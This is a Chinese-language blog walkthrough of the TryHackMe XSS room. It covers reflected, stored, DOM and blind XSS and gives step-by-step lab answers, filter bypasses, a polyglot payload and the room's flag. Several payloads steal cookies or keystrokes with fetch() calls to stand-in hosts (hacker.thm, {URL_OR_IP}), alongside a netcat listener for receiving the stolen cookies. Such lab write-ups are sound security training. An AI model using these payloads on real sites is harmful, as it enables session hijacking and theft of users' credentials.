    <url>/2024/01/27/THM-Cross-site%20Scripting(XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/xss" >https://tryhackme.com/room/xss <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>通过学习相关知识点：了解如何检测和利用 XSS 漏洞，这能让你控制其他访问者的浏览器。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>先决条件：由于 XSS 是基于 JavaScript 的，因此对js语言有基本的了解对学习XSS漏洞会很有帮助；本文相关的XSS示例并不复杂，对客户端-服务器请求和响应有基本的了解即可。</p>
<p>跨站脚本，在网络安全社区中更广为人知的名称是 XSS (Cross-site Scripting)，该漏洞被归类为注入攻击，在XSS攻击中：恶意的 JavaScript代码 将被注入到 Web 应用程序中，并且该js代码意图被其他用户无意间执行。 在本文中，你将了解不同的 XSS 类型、如何创建 XSS 有效载荷、如何修改你的 XSS 有效载荷以绕过XSS过滤器等。</p>
<p>跨站脚本漏洞非常普遍，下面是一些在海量应用中发现的 XSS 漏洞报告；你可以因发现和报告XSS漏洞而获得报酬。</p>
<ul>
<li><a class="link"   href="https://hackerone.com/reports/415484" >XSS found in Shopify <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://hackerone.com/reports/409850" >$7,500 for XSS found in Steam chat <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://hackerone.com/reports/449351" >$2,500 for XSS in HackerOne <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://hackerone.com/reports/283825" >XSS found in Infogram <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221123182521764.png"
                      alt="image-20221123182521764"
                ></p>
<h2 id="XSS-Payloads"><a href="#XSS-Payloads" class="headerlink" title="XSS Payloads"></a>XSS Payloads</h2><p><strong>什么是 payload(有效载荷) ?</strong></p>
<p>在 XSS 中，payload是我们希望在目标计算机上能够被执行的 JavaScript 代码。 payload有两部分，用于 实现意图的部分 和 需要自行修改的部分 。</p>
<p>payload的“意图”部分是你希望 JavaScript代码 实际执行的操作（我们将在下面的一些示例中进行介绍），而payload的“修改”部分是指我们需要对代码进行更改以使其能够成功执行，因为具体的payload在不同的执行场景下可能存在不同之处（在本文的倒数第二小节中会进行介绍）。</p>
<p>下面是关于 XSS payload的“意图”的一些示例：</p>
<p><strong>Proof Of Concept（POC-概念验证）：</strong></p>
<p>这是最简单的XSS payload，你要做的是证明你可以在网站上实现 XSS。 这通常是通过在页面上弹出一个带有文本字符串的警告框来完成的，例如：</p>
<p><code>&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code></p>
<p><strong>Session Stealing（会话窃取）：</strong></p>
<p>用户会话的详细信息（例如登录令牌-login token）通常保存在目标计算机上的 cookie 中。</p>
<p>下面的 JavaScript 能获取目标的 cookie，先通过 base64 编码 cookie 以确保其能成功传输，然后将其发布到黑客所控制的网站以进行记录。 一旦黑客拥有了这些 cookie值，他们就可以接管目标的会话并能以该用户的身份进行登录。</p>
<p><code>&lt;script&gt;fetch(&#39;https://hacker.thm/steal?cookie=&#39; + btoa(document.cookie));&lt;/script&gt;</code></p>
<p><strong>Key Logger（键盘记录器）：</strong></p>
<p>下面的js代码能充当键盘记录器。 这意味着你在网页上键入的任何内容都将被转发到黑客所控制的网站。 如果将该类型的XSS payload放置在目标网站上用于接收用户登录名或信用卡详细信息的代码处，这可能会非常有害。</p>
<p><code>&lt;script&gt;document.onkeypress = function(e) &#123; fetch(&#39;https://hacker.thm/log?key=&#39; + btoa(e.key) );&#125;&lt;/script&gt;</code></p>
<p><strong>Business Logic（业务逻辑）：</strong></p>
<p>这个XSS payload比上面的例子要具体得多，此处会调用特定的网络资源或 JavaScript 函数。 例如，假设存在一个名为 <code>user.changeEmail()</code> 的用于更改用户电子邮件地址的 JavaScript 函数，对应的XSS payload可能如下所示：</p>
<p><code>&lt;script&gt;user.changeEmail(&#39;attacker@hacker.thm&#39;);&lt;/script&gt;</code></p>
<p>如果帐户所对应的电子邮件地址已成功更改，那么攻击者就可以接着尝试执行针对目标用户的重置密码攻击。</p>
<p>接下来的四个小节将涵盖不同类型的 XSS 漏洞，这些 XSS 漏洞的实现都需要我们编写略有不同的XSS payload（经过精心构造的js代码）并且都需要让payload和用户发生交互。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221123201325458.png"
                      alt="image-20221123201325458"
                ></p>
<h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p>当用户在 HTTP 请求中提供的数据未经任何验证就能被包含在网页源代码中时，就会发生反射型 XSS。</p>
<p><strong>示例场景：</strong></p>
<p>假设现在有一个示例网站，如果你在URL中输入的内容不够准确，则会显示一条错误消息。 错误消息的内容将取自查询字符串中的错误（error）参数，并会直接构建到该页面的源代码中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221123223403997.png"
                      alt="image-20221123223403997"
                ></p>
<p>如果该web应用程序不检查错误（error）参数的内容，这将允许攻击者在URL中插入一些恶意代码，从而使攻击者能够构建一个恶意的XSS链接：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221123223607622.png"
                      alt="image-20221123223607622"
                ></p>
<p>该漏洞可以按照下图中的场景进行复现：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221123223707848.png"
                      alt="image-20221123223707848"
                ></p>
<p><strong>潜在影响：</strong></p>
<p>攻击者可以向潜在受害者发送XSS链接，然后让受害者在浏览器上执行相关的XSS payload代码，从而获取到用户会话信息或用户的其他信息（作为测试使用时，XSS payload在执行后 往往产生弹窗、页面重定向、页面嵌套等效果）。</p>
<p><strong>如何测试反射型 XSS：</strong></p>
<p>你需要测试每个可能的XSS漏洞入口点，包括：</p>
<ul>
<li>URL 查询字符串中的参数（Parameters ）</li>
<li>URL 文件路径</li>
<li>HTTP 标头（尽管在实践中不太可能存在XSS漏洞利用）</li>
</ul>
<p>一旦你发现了能够反映在 Web 应用程序中的一些数据，你就需要确认你可以成功运行你的 JavaScript Payload；你所构造的Payload将取决于你的代码在web应用程序中的位置。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221123230940702.png"
                      alt="image-20221123230940702"
                ></p>
<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>顾名思义，存储型XSS的payload能够存储在 Web 应用程序中（例如，将XSS payload存储在数据库中），然后在其他用户访问站点或网页时就能自动运行相关的XSS payload。</p>
<p><strong>示例场景：</strong></p>
<p>假设存在一个允许用户发表评论的博客网站，而且评论在发表时不会被检查是否包含 JavaScript代码 或者被过滤掉恶意代码；如果我们在此博客网站上发布包含 JavaScript代码 的评论，那么这些代码将会被存储到 该博客网站所对应的web服务器的后端数据库中。当其他用户访问 包含恶意代码的评论 所对应的博客文章时，用户所使用的浏览器就会自动运行我们之前所嵌入的JavaScript代码。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221124193527880.png"
                      alt="image-20221124193527880"
                ></p>
<p><strong>潜在影响：</strong></p>
<p>存储型 XSS 中的恶意 JavaScript 代码可以将用户重定向到另一个站点、窃取用户的会话 cookie，或者在充当访问用户的同时在目标网站上执行一些其他操作。</p>
<p><strong>如何测试存储型 XSS：</strong></p>
<p>你需要测试 在某个网站上能够存储数据的每个可能的入口点，并且这些被存储的数据能够显示在其他用户可以访问的区域，比如：</p>
<ul>
<li>用户发出的对博客文章的评论</li>
<li>用户的资料信息</li>
<li>网站的列表信息</li>
</ul>
<p>有时候开发人员会认为在客户端限制用户输入值已经是足够好的保护措施，因此尝试将用户输入值更改为 Web 应用程序所不期望的内容是发现存储型 XSS 漏洞的一个很好的方法，例如，一个表单中的年龄（age ）字段通常会期望你提供下拉菜单中的一个整数值，但是，你可以尝试手动发送请求（而不是使用表单来发送请求），这可能将允许你嵌入一些恶意的XSS payload。</p>
<p>当你找到存储在 Web 应用程序中的一些数据后，你需要再次确认你是否可以成功运行 JavaScript payload，你使用的XSS payload的内容将取决于你的代码在web应用程序中的具体位置。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221124215549328.png"
                      alt="image-20221124215549328"
                ></p>
<h2 id="基于DOM的-XSS"><a href="#基于DOM的-XSS" class="headerlink" title="基于DOM的 XSS"></a>基于DOM的 XSS</h2><p><strong>什么是 DOM?</strong></p>
<p>DOM 代表文档对象模型(Document Object Model)，是 HTML 和 XML 文档的应用程序编程接口(API-application programming interface)，它代表的是一个页面，以便程序可以更改文档结构、样式和内容。 </p>
<p>所以网页就是一个文档，这个文档可以显示在浏览器窗口中，也可以作为 HTML 源。下面是一个关于 HTML DOM 的图表：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221124220954543.png"
                      alt="image-20221124220954543"
                ></p>
<p>如果你想了解有关 DOM 的更多信息，可以访问 <a class="link"   href="https://www.w3.org/TR/REC-DOM-Level-1/introduction.html" >w3.org相关页面 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
<p><strong>对DOM的利用</strong></p>
<p>基于 DOM 的 XSS 能够让 JavaScript恶意代码 直接在浏览器中执行，而无需加载任何新页面或将数据提交给后端代码。当网站上的 JavaScript恶意代码 作用于输入或与用户发生交互时，该代码就会被执行。</p>
<p><strong>示例场景：</strong></p>
<p>假设目标网站上的 JavaScript 能从 <code>window.location.hash</code> 参数中获取内容，然后将其写入当前正在被查看的网页页面中；如果该目标站点不会检查哈希值的内容是否存在恶意js代码，那么这将允许攻击者将他们自己所选择的 JavaScript代码 注入到当前正在被查看的网页中。</p>
<p><strong>潜在影响：</strong></p>
<p>攻击者可以将精心制作的基于DOM的 XSS链接发送给潜在的受害者，然后将受害者访问的页面重定向到另一个网站或者从用户所访问的当前页面、用户当前的会话中窃取内容。</p>
<p><strong>如何测试基于DOM的 XSS：</strong></p>
<p>对 基于 DOM 的 XSS 进行测试可能具有挑战性，并且需要一定的 JavaScript 知识才能阅读相关源代码。 你需要查找攻击者可以控制的并且能够访问某些变量的代码部分，例如“<code>window.location.x</code>”参数。</p>
<p>找到这些代码后，你需要查看它们是如何处理变量的，以及这些值是否曾被写入网页的DOM中 或者 能够被传递给不安全的 JavaScript 方法–例如 <code>eval()</code>方法。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221125184753876.png"
                      alt="image-20221125184753876"
                ></p>
<h2 id="Blind-盲注-XSS"><a href="#Blind-盲注-XSS" class="headerlink" title="Blind(盲注)XSS"></a>Blind(盲注)XSS</h2><p>盲注类型的 XSS 类似于存储型 XSS，因为在此种类型的XSS攻击中 XSS payload 也会被存储在目标网站上以供其他用户执行，但是在这种XSS攻击中，你看不到相关的XSS payload是如何工作的或者你无法自行测试该XSS payload。</p>
<p><strong>示例场景：</strong></p>
<p>假设目标网站有一个联系表单，你可以通过该表单向网站相关工作人员发送消息。如果目标站点不检查邮件内容是否有任何恶意代码，这将使得攻击者可以在邮件中输入他们想要的任何内容；然后，这些邮件消息会变成目标站点的业务工单，员工可以在私人门户(入口页)网站上查看这些工单，从而触发XSS攻击。</p>
<p><strong>潜在影响：</strong></p>
<p>当攻击者使用了正确的XSS payload时，相关代码就可以回调攻击者所拥有的网站，从而显示目标站点的员工门户(入口页) URL、员工的 cookie，甚至员工正在查看的门户(入口页)内容；然后攻击者就可以尝试劫持员工的会话并访问一些私有门户(入口页)。</p>
<p><strong>如何测试Blind（盲注）型 XSS：</strong></p>
<p>在测试 Blind XSS 漏洞时，你需要确保你的 XSS payload 有回调（通常是一个HTTP请求）；这样，你就能知道你的代码是否被执行以及何时被执行。</p>
<p>一种流行的Blind XSS 攻击工具是 <a class="link"   href="https://xsshunter.com/" >xsshunter <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。 虽然你可以用 JavaScript代码 制作你自己的工具，但是通过使用xsshunter工具（该工具页面处于关闭注册状态）会自动帮助你捕获 cookie、URL、页面内容等。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221125191134331.png"
                      alt="image-20221125191134331"
                ></p>
<h2 id="完善你的XSS-payload（实验）"><a href="#完善你的XSS-payload（实验）" class="headerlink" title="完善你的XSS payload（实验）"></a>完善你的XSS payload（实验）</h2><p>XSS有效载荷（payload）是我们要让其他用户在他们的浏览器上执行的 JavaScript 代码，或者也可以作为概念证明（POC）来演示一些网站中的XSS漏洞。</p>
<p>你的有效载荷可能有多种用途，可以只是调出一个 JavaScript 警告框以证明我们能在目标网站上执行 JavaScript代码，也可以从网页或用户会话中提取一些敏感信息。</p>
<p>你的 JavaScript 有效载荷如何反映在目标网站的代码内容中 将决定你具体需要使用怎样的有效载荷。为了很好的理解这一点，我们需要启动TryHackMe实验房间在本小节中所提供的目标机器，然后访问目标站点（ <a class="link"   href="https://lab_web_url.p.thmlabs.com/" >https://lab_web_url.p.thmlabs.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ），尝试完成相关的实验操作。</p>
<p>每个XSS关卡级别的目标都是使用字符串 THM 来执行 JavaScript 警告框功能，例如：</p>
<p><code>&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;</code></p>
<p><em><strong>Level One:</strong></em></p>
<p>在此XSS关卡，你会看到一个表格，要求你输入姓名，一旦你输入了你的姓名并且点击了Enter按钮，姓名内容将显示在输入框的下面一行，例如：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221125195947941.png"
                      alt="image-20221125195947941"
                ></p>
<p>如果你查看当前页面的源代码，你会看到你输入的姓名信息能被反映在代码中：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221125200137180.png"
                      alt="image-20221125200137180"
                ></p>
<p>接下来，我们将尝试输入以下 JavaScript 有效载荷，而不是输入姓名信息：<code>&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;</code></p>
<p>现在，当你点击Enter按钮时，你将看到一个带有字符串 THM 的警告框被弹出，相关的页面源代码如下所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221125200535122.png"
                      alt="image-20221125200535122"
                ></p>
<p>然后，你将收到一条确认消息，这表明你的payload已成功执行，这条确认消息中还会带有指向下一XSS关卡的链接。</p>
<p><em><strong>Level Two:</strong></em></p>
<p>与上一关卡一样，系统会再次要求你在输入框输入姓名信息。 这次当你点击回车按钮时，你会发现姓名信息被反映在一个输入(input)标签中：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221125200920338.png"
                      alt="image-20221125200920338"
                ></p>
<p>查看相关的页面源代码，你可以看到你输入的姓名信息反映在 input 标签的 value 属性中：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221125201040848.png"
                      alt="image-20221125201040848"
                ></p>
<p>如果你在此处尝试上一关卡中的 JavaScript 有效载荷，你会发现它将无法工作，因为你无法从输入(input)标签内部直接运行之前的有效载荷。在此处，我们需要先对输入(input)标签进行闭合处理，这样才能正常运行相关的payload；你可以使用以下有效载荷执行此操作：</p>
<p><code>&quot;&gt;&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;</code></p>
<p>这个有效载荷的重要部分是<code>&quot;&gt;</code>，它会关闭 value 参数，然后接着关闭输入(input)标签。</p>
<p>现在我们已经正确关闭了 input 标签并能使我们构造的 JavaScript 有效载荷得到运行，payload执行结果将反映在相关页面的源代码中：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221125201914663.png"
                      alt="image-20221125201914663"
                ></p>
<p>当你单击回车按钮时，你将看到一个带有字符串 THM 的警告框被弹出。 然后，你将收到一条确认消息，表明你的payload已成功执行，该消息还将带有指向下一XSS关卡的链接。</p>
<p><em><strong>Level Three:</strong></em></p>
<p>在此关卡你会看到另一个询问你姓名的表单，与上一级关卡相同，你的姓名信息会反映在页面源码的 HTML 标签中，在此处是 textarea 标签。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221125202407190.png"
                      alt="image-20221125202407190"
                ></p>
<p>我们必须使用以下payload对 textarea 标签进行闭合，这与之前闭合 input 标签（在关卡二中）略有不同：</p>
<p><code>&lt;/textarea&gt;&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221125211621901.png"
                      alt="image-20221125211621901"
                ></p>
<p>上述有效载荷的重要部分是<code>&lt;/textarea&gt;</code>，这会导致 textarea 元素关闭，以便payload有效部分得以运行。</p>
<p>当你单击回车按钮时，你将看到一个带有字符串 THM 的警告框被弹出；然后，你将收到一条确认消息，表明你的payload已成功执行，该消息还将带有指向下一XSS关卡的链接。</p>
<p><em><strong>Level Four:</strong></em></p>
<p>和之前关卡一样，当你在表单中输入姓名之后，你会在页面源码中看到它。 这一关看起来与第一关相似，但在检查页面源代码之后，你会看到你输入的姓名信息将反映在以下 JavaScript 代码中：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221125212321185.png"
                      alt="image-20221125212321185"
                ></p>
<p>你必须闭合现有的一些 JavaScript 代码段，以便能够运行你的payload有效部分代码；你可以使用以下有效载荷 <code>&#39;;alert(&#39;THM&#39;);//</code> ，从下面的页面源代码截图中可以看到该payload代码的注入情况。</p>
<p>其中 <code>&#39;</code>用于关闭指定name的字段，然后 <code>;</code> 可用于表示代码段的结束，末尾的 <code>//</code> 能够使它后面所接的任何内容都成为注释而非可执行代码部分。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221125214406567.png"
                      alt="image-20221125214406567"
                ></p>
<p>当你单击回车按钮时，你将看到一个带有字符串 THM 的警告框被弹出；然后，你将收到一条确认消息，表明你的payload已成功执行，该消息还将带有指向下一XSS关卡的链接。</p>
<p><em><strong>Level Five:</strong></em></p>
<p>该关卡看起来和第一关一样，但是，当你使用 <code>&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;</code> 作为有效载荷时，你会发现此payload并不会起作用。你可以查看相关页面源代码，以明白payload失效原因：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221125215309944.png"
                      alt="image-20221125215309944"
                ></p>
<p>从上图中，你会发现<code>script</code>这个词会从有效载荷中删除，这是因为目标页面存在一个过滤器可以去除任何潜在的危险词。</p>
<p>当目标页面会从你输入的字符串中删除危险词时，你可以尝试一个有用的技巧来绕过该过滤器：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221125215813629.png"
                      alt="image-20221125215813629"
                ></p>
<p>尝试输入有效载荷 <code>&lt;sscriptcript&gt;alert(&#39;THM&#39;);&lt;/sscriptcript&gt;</code>，然后单击回车按钮，你将看到一个带有字符串THM的警告框被弹出；然后，你将收到一条确认消息，表明你的payload已成功执行，该消息还将带有指向下一XSS关卡的链接。</p>
<p><em><strong>Level Six:</strong></em></p>
<p>该关卡看起来和第二关类似，我们需要闭合标签以及该标签中的属性值，我们尝试使用有效载荷 <code>&quot;&gt;&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;</code>，但这似乎不起作用，我们可以查看一下相关页面的源代码以便了解上述payload失效原因：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221125220456444.png"
                      alt="image-20221125220456444"
                ></p>
<p>你可以看到 <code>&lt;</code> 和 <code>&gt;</code> 字符会从我们的payload中被过滤，从而阻止了我们闭合 IMG 标签。 为了绕过该过滤器，我们可以利用 IMG 标签的附加属性，例如 <em><strong>onload</strong></em> 事件；一旦 <em><strong>src</strong></em> 属性中指定的图像被加载到当前网页上，onload 事件就会执行你指定的payload代码。</p>
<p>使用以下有效载荷 <code>/images/cat.jpg&quot; onload=&quot;alert(&#39;THM&#39;);</code>，然后查看对应的页面源代码，你将看到此payload如何开始工作。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221125221135597.png"
                      alt="image-20221125221135597"
                ></p>
<p>现在，当你单击回车按钮时，你将看到一个带有字符串 THM 的警告框被弹出；然后，你会收到一条确认消息，表明你的payload已成功执行。完成此关卡你将获取到一个最终的flag。</p>
<p><em><strong>Polyglots（多语言）:</strong></em></p>
<p>XSS polyglot 是一串文本，可以将闭合属性、闭合标签和绕过过滤器合而为一。 你可以在刚刚完成的六个关卡中使用以下多语言payload，并且都会得到成功执行。</p>
<div class="highlight-container" data-rel="Txt"><figure class="iseeu highlight txt"><table><tr><td class="code"><pre><span class="line">jaVasCript:/*-/*`/*\`/*&#x27;/*&quot;/**/(/* */onerror=alert(&#x27;THM&#x27;) )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert(&#x27;THM&#x27;)//&gt;\x3e</span><br></pre></td></tr></table></figure></div>

<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221125213124007.png"
                      alt="image-20221125213124007"
                ></p>
<p>启动目标机器，访问目标站点： <a class="link"   href="https://10-10-33-53.p.thmlabs.com/" >https://10-10-33-53.p.thmlabs.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>关卡1：payload <code>&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126143216275.png"
                      alt="image-20221126143216275"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126143244474.png"
                      alt="image-20221126143244474"
                ></p>
<p>关卡2：payload <code>&quot;&gt;&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126143417254.png"
                      alt="image-20221126143417254"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126143322719.png"
                      alt="image-20221126143322719"
                ></p>
<p>关卡3：payload <code>&lt;/textarea&gt;&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126143520471.png"
                      alt="image-20221126143520471"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126143450961.png"
                      alt="image-20221126143450961"
                ></p>
<p>关卡4：payload <code>&#39;;alert(&#39;THM&#39;);//</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126143627043.png"
                      alt="image-20221126143627043"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126143549627.png"
                      alt="image-20221126143549627"
                ></p>
<p>关卡5：payload <code>&lt;sscriptcript&gt;alert(&#39;THM&#39;);&lt;/sscriptcript&gt;</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126143736538.png"
                      alt="image-20221126143736538"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126143650789.png"
                      alt="image-20221126143650789"
                ></p>
<p>关卡6：payload <code>/images/cat.jpg&quot; onload=&quot;alert(&#39;THM&#39;);</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126143814413.png"
                      alt="image-20221126143814413"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126143931572.png"
                      alt="image-20221126143931572"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126143856864.png"
                      alt="image-20221126143856864"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126144012752.png"
                      alt="image-20221126144012752"
                ></p>
<blockquote>
<p>THM{XSS_MASTER}</p>
</blockquote>
<h2 id="练习-Blind-XSS"><a href="#练习-Blind-XSS" class="headerlink" title="练习(Blind XSS)"></a>练习(Blind XSS)</h2><p>本文最后一个任务，我们将尝试发现一个 Blind XSS 漏洞。在本知识点对应的TryHackMe实验房间中：确保你终止了上一小节的目标机器，然后单击本小节右侧的绿色“启动机器”按钮以加载 Acme IT Support 网站（目标站点）。 </p>
<p>你需要使用该TryHackMe实验房间页面顶部的蓝色按钮来加载 AttackBox，成功加载后，在 AttackBox 的 Firefox 浏览器中打开下面的链接（需等待链接刷新）以查看目标网站：<a class="link"   href="https://lab_web_url.p.thmlabs.com/" >https://lab_web_url.p.thmlabs.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>单击目标站点顶部导航栏上的“客户”选项卡，然后单击“在此处注册”链接以创建一个新帐户；一旦你的帐户设置完毕，请单击“Support Tickets”选项卡，这是我们将要检测的可能存在XSS漏洞的功能点。</p>
<p>尝试通过单击绿色的“创建ticket”按钮来创建Support ticket，输入主题和内容，你可以仅输入“test”一词，然后单击蓝色的“创建ticket”按钮，然后你就会在列表中注意到你有一个带有 ID 号的新ticket，你可以单击它以查看该ticket的具体信息。</p>
<p>与研究第三小节的反射型XSS一样，我们会在此处研究先前输入的文本将如何反映在页面源码中。查看页面源代码后，我们可以看到先前我们输入的文本会被放置在 <code>textarea</code> 标签内。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126082612108.png"
                      alt="image-20221126082612108"
                ></p>
<p>现在让我们返回并创建另一张工单，让我们看看是否可以通过在 ticket 的内容中输入以下有效载荷来闭合<code>textarea</code>标签： <code>&lt;/textarea&gt;test</code></p>
<p>同样，此时再打开ticket信息并查看页面源代码，可以看到我们已经成功闭合了 <code>textarea</code> 标签。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126083341742.png"
                      alt="image-20221126083341742"
                ></p>
<p>现在让我们扩展上述payload，看看我们是否可以运行恶意JavaScript代码并确认ticket创建功能是否存在XSS漏洞，使用以下payload尝试创建另一张新的ticket ：</p>
<p><code>&lt;/textarea&gt;&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;</code></p>
<p>此时当你查看ticket内容时，你应该会看到一个带有字符串 <em><strong>THM</strong></em> 的警告框；我们接下来将进一步扩展有效载荷并增加XSS漏洞影响力。 由于刚才检测的功能点可以创建support ticket，所以我们有理由相信，网站的工作人员也会查看我们所创建的可以执行 JavaScript payload 的 ticket。</p>
<p>从用户(网站工作人员)那里提取的一些有用信息可以是用户(网站工作人员)的 cookie值，我们可以使用XSS来劫持用户(网站工作人员)的登录会话以提升我们的访问特权。 为此，我们的有效载荷需要提取用户(网站工作人员)的 cookie信息 并将其泄露到我们所选择的另一个web服务器中，所以我们需要在攻击机上设置一个监听服务来接收信息。</p>
<p>在TryHackMe AttackBox上，通过使用Netcat 设置一个监听服务器：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">user@machine$ </span><span class="language-bash">nc -nlvp 9001</span></span><br></pre></td></tr></table></figure></div>

<p>现在我们已经设置了接收泄露信息的方法，我们可以开始构建有效载荷：</p>
<p><code>&lt;/textarea&gt;&lt;script&gt;fetch(&#39;http://&#123;URL_OR_IP&#125;?cookie=&#39; + btoa(document.cookie) );&lt;/script&gt;</code></p>
<p>让我们分解上述有效载荷：</p>
<ul>
<li><code>&lt;/textarea&gt;</code> 标签用于闭合页面源码中的 textarea 标签；</li>
<li><code>&lt;script&gt; </code> 标签为我们打开了一个可以编写 JavaScript 的区域；</li>
<li><code>fetch()</code> 命令用于发出 HTTP 请求；</li>
<li><code>&#123;URL_OR_IP&#125;</code> 是 THM 请求捕获器的URL或者指向THM AttackBox的IP地址或者你在使用本地攻击机时所对应的THM VPN网络中的IP地址；</li>
<li><code>?cookie=</code> 是包含受害者(网站工作人员) cookie 的查询字符串；</li>
<li><code>btoa()</code>命令表示对受害者(网站工作人员)的 cookie信息 进行base64编码；</li>
<li><code>document.cookie</code>用于获取 Acme IT Support网站相关受害者(网站工作人员)的 cookie值；</li>
<li><code>&lt;/script&gt;</code> 用于关闭 JavaScript 代码块。</li>
</ul>
<p>使用上面的有效载荷在目标站点上创建一个ticket，将 <code>&#123;URL_OR_IP&#125;</code>变量改为攻击机对应设置（确保payload中的端口号为 Netcat 侦听器所指定的端口号），然后等待一分钟，你将看到包含受害者(网站工作人员)cookie信息的http请求。</p>
<p>注意：当你使用自己的 VM 时，你可能会遇到通过 VPN 接收http请求的问题，所以建议使用TryHackMe AttackBox 来完成此任务。</p>
